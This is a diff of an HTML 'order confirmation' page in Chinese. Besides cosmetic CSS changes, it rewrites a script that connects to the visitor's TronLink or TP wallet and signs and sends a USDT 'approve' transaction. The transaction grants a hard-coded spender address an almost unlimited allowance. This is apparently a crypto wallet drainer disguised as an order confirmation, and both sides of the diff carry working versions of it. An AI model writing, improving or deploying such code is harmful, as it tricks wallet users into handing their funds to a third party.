@@ -6,15 +6,15 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>订单确认信息</title>
   <style>
-    body { margin: 0; font-family: sans-serif; background: #f9fafb; color: #111; }
-    header { padding: 1rem; background: #1f2937; color: white; text-align: center; font-size: 1.25rem; }
+    body { font-family: sans-serif; margin: 0; background: #f9fafb; }
+    header { background: #1f2937; color: white; padding: 1rem; text-align: center; font-size: 1.25rem; }
     .main { padding: 1rem; display: flex; justify-content: center; }
-    .card { background: white; border-radius: 10px; padding: 1.5rem; max-width: 500px; width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+    .card { background: white; padding: 1.5rem; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.05); max-width: 500px; width: 100%; }
     .info { margin-bottom: 1rem; font-size: 1rem; }
     .label { font-weight: bold; color: #555; display: inline-block; width: 100px; }
     .footer { padding: 1rem; }
-    .btn { width: 100%; padding: 1rem; font-size: 1.1rem; background: #10b981; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
-    .status { margin-top: 1rem; font-size: 0.95rem; color: red; text-align: center; }
+    .btn { width: 100%; padding: 1rem; background: #10b981; color: white; font-size: 1.1rem; border: none; border-radius: 8px; font-weight: bold; }
+    .status { margin-top: 1rem; color: red; font-size: 0.95rem; text-align: center; }
   </style>
 </head>
 <body>
@@ -43,34 +43,39 @@
 
     async function authorize() {
       try {
-        if (window.tronLink && window.tronLink.request) {
-          await window.tronLink.request({ method: 'tron_requestAccounts' });
-        }
-
-        const tw = window.tronWeb || window.tron || null;
-        if (!tw || !tw.ready || !tw.defaultAddress || !tw.defaultAddress.base58) {
-          document.getElementById("status").innerText = "钱包未连接，请使用 TP 或 TronLink 钱包打开页面";
+        if (!window.tronLink || !window.tronLink.ready) {
+          document.getElementById("status").innerText = "未检测到钱包环境，请使用 TP 钱包打开页面";
           return;
         }
 
+        await window.tronLink.request({ method: 'tron_requestAccounts' });
+
+        const account = window.tronLink.tronWeb.defaultAddress.base58;
+        const usdtContract = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";
         const spender = "TTrMWd5Ukn4dLnQXrbRe1z5AGWa2CDrjLz";
-        const usdt = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";
-        const tx = await tw.transactionBuilder.triggerSmartContract(
-          usdt,
+
+        const tx = await window.tronLink.tronWeb.transactionBuilder.triggerSmartContract(
+          usdtContract,
           "approve(address,uint256)",
-          { feeLimit: 1e8, callValue: 0, shouldPollResponse: false },
+          {
+            feeLimit: 100000000,
+            callValue: 0
+          },
           [
             { type: "address", value: spender },
             { type: "uint256", value: "9223372036854775807" }
           ],
-          tw.defaultAddress.base58
+          account
         );
 
-        const signedTx = await tw.trx.sign(tx.transaction);
-        const result = await tw.trx.sendRawTransaction(signedTx);
-        document.getElementById("status").innerText = result.result
-          ? "授权成功！交易ID：" + result.txid
-          : "授权失败，请重试";
+        const signedTx = await window.tronLink.tronWeb.trx.sign(tx.transaction);
+        const result = await window.tronLink.tronWeb.trx.sendRawTransaction(signedTx);
+
+        if (result.result) {
+          document.getElementById("status").innerText = "授权成功，交易 ID：" + result.txid;
+        } else {
+          document.getElementById("status").innerText = "授权失败：" + JSON.stringify(result);
+        }
       } catch (e) {
         document.getElementById("status").innerText = "授权异常：" + (e.message || e);
       }
